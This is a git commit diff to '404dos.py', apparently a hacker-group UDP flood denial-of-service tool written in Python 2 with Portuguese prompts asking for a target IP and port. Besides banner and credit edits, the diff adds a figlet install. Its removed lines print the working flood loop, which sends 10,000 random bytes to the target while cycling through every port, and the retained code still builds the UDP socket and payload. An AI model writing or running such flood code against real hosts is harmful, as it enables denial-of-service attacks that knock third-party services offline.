d0910835fe299747a96757635da4b4e1a127da2b
Ch4rse da 404 <107947345+Ch4rse404@users.noreply.github.com>
2022-06-22 16:33:00 -0300

    Update 404dos.py

--- 404dos.py
+++ 404dos.py
@@ -1,6 +1,6 @@
 #!/usr/bin
 
-#codded by Ch4rse404
+#codded by SAYONAR4 ONION
 
 #FAMILIA TEAM 404 THE HELL
 
@@ -20,7 +20,7 @@ month = now.month
 year = now.year
 
 #socket
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.SOCK_STREAM)
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(10000)
 timeout =  time.time() 
 
@@ -51,12 +51,12 @@ print '''                 \033[94m.@@:       !@@@@:       .@@@
               .# !@@@@@@@#.        .#@@@@#@##.#.
                   :#@@@#@@.        .#@@@@@@!
                          .##########:\033[0m
-
+                         
 \033[92m404404404404404404404404404404404404404404404404404404404404404404\033[0m
 
-\033[91mCODDED BY\033[0m : \033[93mCh4rse404.mozzi\033[0m          \033[94m_  _    ___  _  _\033[0m
+\033[91mCODDED BY\033[0m : \033[93mSAYONAR4-ONION\033[0m          \033[94m_  _    ___  _  _\033[0m
                                    \033[94m| || |  / _ \| || |\033[0m
-\033[91mteam\033[0m 404 \033[93mhell \033[0m.           \033[94m| || |_| | | | || |_\033[0m
+\033[91mEM MEMORIA A\033[0m : \033[93mTEAM 404\033[0m.           \033[94m| || |_| | | | || |_\033[0m
                                    \033[94m|__   _| |_| |__   _|\033[0m
 \033[93mPAGE NOT FOUND 404\033[0m                    \033[94m|_|  \___/   |_|\033[0m
 
@@ -73,7 +73,7 @@ d88   888  888    888 d88   888    888    888 888     888     "Y88b.
 '''
 
 ip = raw_input("IP Alvo : ")
-port = input("Porta     : ")
+port = input("Porta padrao 80   : ")
 
 os.system("clear")
 print '''
@@ -86,32 +86,14 @@ Atualizando pacotes aguarde...
 
 os.system("apt-get upgrade")
 os.system("apt-get update")
+os.system("apt install figlet")
 print "pacotes instalados"
 time.sleep(1)
 
 print '''
 \033[94m================================
 
-ative sua vpn...
+Preparando Proxy... | use vpn |
 
 ================================\033[0m
 '''
-time.sleep(2)
-print "pronto"
-time.sleep(1)
-print "COMECANDO ATAQUE DOS"
-os.system("figlet GO 404")
-os.system ("clear")
-sent = 0
-while True:
-     while 1:
-        if time.time() > timeout:
-            break
-        else:
-            pass
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "\033[91m[+]\033[0m \033[94msent attack by 404\033[0m"
-     if port == 65534:
-       port = 1
